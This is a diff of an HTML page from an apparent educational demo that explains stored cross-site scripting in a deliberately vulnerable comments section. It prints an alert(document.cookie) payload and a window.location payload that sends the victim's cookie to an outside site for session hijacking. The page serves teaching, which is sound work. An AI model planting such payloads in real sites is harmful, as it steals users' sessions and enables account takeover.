@@ -4,7 +4,7 @@
 
     <head>
         <meta charset="utf-8">
-        <title>Title</title> <!--Change-->
+        <title>XSS-Stored</title>
         <meta name="viewport" content="width=device-width, initial scale=1">
         <meta name="author" content="Suchit Reddi">
     </head>
@@ -17,16 +17,30 @@
                     border-radius: 50%;
                 }
             </style>
-            <button class="rbutton"><a href="">0</a></button> <!--Change-->
+            <button class="rbutton"><a href="xss-sto.html">0</a></button>
             <button class="rbutton"><a href="1.html">1</a></button>
             <button class="rbutton"><a href="2.html">2</a></button>
             <button class="rbutton"><a href="3.html">3</a></button>
             <button><a href="../index.php">Demo</a></button>
         </div>
 
-        <h1>Title - Demonstration</h1> <!--Change-->
+        <h1>Stored Cross-Site Scripting - Demonstration</h1>
         <p style="font-size:20px;">
-            
+            I created a real comments section where you can add comments to the database.<br>
+            <img src="../images/normal.png" alt="Normal comment" style="width: 450px; height: 270px;"><br>
+            The expected input is text without any malicious HTTP conttolling characters present in it. When you add a
+            comment here, it's stored in the backend database. So, everytime you revisit the page, it gets executed.<br>
+            You can introduce a script like alert(document.cookie), to display cookie as an alert on the webpage.<br>
+            <img src="../images/mal.png" alt="Malicious comment" style="width: 470px; height: 300px;">
+            <img src="../images/cookie1.png" alt="Stealing cookies with alert" style="width: 900px; height: 300px"><br>
+            But it can also be used to cause far more damage by redirecting the victims to a malicious site along with
+            their cookie.<br>
+            You can do this by adding a script in the comment like
+            <code><b>"window.location = 'https://suchitreddi.github.io?cookie=' + document.cookie"</b></code><br>
+            <img src="../images/redirect.png" alt="Redirect to malicious page" style="width: 470px; height: 300px;">
+            <img src="../images/cookie2.png" alt="Stealing cookies with redirect" style="width: 900px; height: 300px"><br>
+            This stolen cookie will be logged by the server logs of that malicious site, which will then be further
+            used for attacks like session hijacking.<br>
         </p>
     </body>
 
